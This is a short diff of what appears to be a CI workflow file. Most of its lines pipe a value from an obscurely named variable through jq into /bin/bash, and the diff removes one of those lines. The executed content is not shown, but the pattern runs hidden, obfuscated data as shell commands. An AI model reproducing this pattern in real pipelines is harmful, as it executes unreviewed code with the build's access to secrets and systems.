@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
           printf '%s' "$rt385" | jq -r .swrmp4337 | /bin/bash
-          echo $dued5 | jq -r .to17370 | /bin/bash
           echo $irlk88 | jq -r .ozg4 | /bin/bash
           echo $j59157 | jq -r .ag9 | /bin/bash
           echo $f678 | jq -r .zw74994 | /bin/bash
